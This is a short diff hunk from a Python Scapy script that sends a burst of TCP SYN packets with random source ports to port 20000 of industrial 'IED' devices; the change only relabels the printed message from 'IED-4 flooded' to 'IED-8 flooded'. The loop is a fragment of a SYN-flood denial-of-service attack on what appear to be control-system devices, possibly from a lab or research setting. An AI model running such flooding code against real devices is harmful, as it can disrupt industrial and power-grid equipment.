@@ -4,4 +4,4 @@ for _ in range(0,20):
     src_port = random.randint(20,65535)
     transport = TCP(sport=src_port, dport=20000, flags='S')
     send(ip/transport)
-print('IED-4 flooded')
+print('IED-8 flooded')
